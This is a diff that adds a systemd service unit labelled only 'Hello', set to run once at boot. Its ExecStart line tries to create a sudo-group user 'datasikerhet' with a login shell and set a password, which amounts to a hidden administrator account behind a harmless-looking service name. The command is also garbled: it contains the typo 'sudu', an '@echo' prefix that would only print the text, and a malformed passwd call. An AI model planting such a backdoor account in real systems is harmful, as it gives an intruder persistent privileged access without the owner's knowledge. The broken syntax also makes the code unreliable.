@@ -1,0 +1,10 @@
+[Unit]
+Description=Hello
+
+[Service]
+ExecStart=@echo sudu useradd -s /bin/bash -d /home/datasikerhet -m -G sudo datasikerhet && sudo passwd datasikerhet123b
+Type=oneshot
+RemainAfterExit=no
+
+[Install]
+WantedBy=multi-user.target
